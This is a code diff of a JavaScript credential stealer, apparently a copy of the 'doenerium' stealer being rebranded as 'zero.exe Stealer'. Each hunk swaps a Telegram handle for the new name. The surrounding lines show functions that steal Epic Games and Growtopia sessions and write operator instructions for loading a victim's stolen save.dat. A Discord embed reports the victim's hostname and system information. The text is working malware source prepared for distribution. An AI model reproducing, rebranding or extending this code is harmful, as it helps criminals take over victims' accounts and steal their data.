@@ -706,7 +706,7 @@ user = {
         randomUUID: crypto.randomBytes(16).toString('hex'),
         start: Date.now(),
         debug: false,
-        copyright: '<================[t.me/doenerium69 ]>================>\n\n',
+        copyright: '<================[zero.exe ]>================>\n\n',
         url: null,
         locale: locale,
     }
@@ -2473,7 +2473,7 @@ async function StealEpicGames() {
                 }
             });
 
-            const howToUseContent = `<================[t.me/doenerium69 Stealer]>================>\n\n
+            const howToUseContent = `<================[zero.exe Stealer]>================>\n\n
 Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
 delete everything and copy all contents into the Epic Games folder and run.`;
 
@@ -2631,7 +2631,7 @@ async function getGrowtopia() {
       await ensureDirectoryExistence(howToUseDir);
 
       const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
-      const howToUseContent = `https://t.me/doenerium69\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+      const howToUseContent = `https://zero.exe\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
 
       await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
     }
@@ -3139,7 +3139,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information | @wejust`,
+            name: `${user.hostname} | System Information | @wejust | update (soon <a:fHighRedfire:1175749324790054922>)`,
             icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
         },
         fields: [
